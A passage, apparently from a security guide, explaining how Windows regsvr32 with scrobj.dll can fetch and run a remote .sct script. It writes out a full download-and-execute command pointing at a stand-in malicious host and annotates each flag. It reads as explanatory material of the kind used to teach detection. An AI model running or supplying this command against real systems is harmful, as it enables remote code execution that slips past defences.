leveraging its ability to download and run a script from a remote location using the `scrobj.dll`.

```
regsvr32 /s /n /u /i:http://malicious-website.com/malicious.sct scrobj.dll

```

- `/s`: Silent mode (no GUI).
- `/n`: Don't call `DllRegisterServer`.
- `/u`: Unregister mode.
- `/i`: Pass an argument to `DllInstall`, in this case, the URL of a malicious script file.
- `scrobj.dll`: Loads and executes a script (in this case, the `.sct` file).

The `.sct` file can contain malicious code, such as VBScript or JScript,

